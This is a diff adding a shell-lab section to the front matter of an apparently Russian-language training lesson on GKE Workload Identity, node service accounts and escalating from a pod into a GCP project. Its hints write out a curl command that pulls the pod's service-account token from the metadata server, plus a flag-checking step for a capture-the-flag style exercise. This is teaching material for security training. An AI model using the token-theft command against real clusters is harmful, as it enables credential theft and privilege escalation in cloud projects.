@@ -13,6 +13,18 @@ useful_for:
   - "Lateral movement от пода к проекту GCP"
 estimated_minutes: 50
 summary: "GKE: node service account, Workload Identity и metadata-сервер пода. Как из контейнера получить токен GCP, перечислить права и эскалировать в проект."
+lab:
+  kind: shell
+  title: "Практика: GKE — Workload Identity и node SA"
+  toolset: [core, curl]
+  workdir: /home/student/gke
+  files: [task.md, notes.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Возьми токен SA пода: `curl -s -H \"Metadata-Flavor: Google\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`."
+    - "Затем прочитай атрибут с флагом: `.../instance/attributes/flag`."
+    - "Найди флаг: `curl ... attributes/flag > found.txt`."
+
 ---
 
 ## Задача
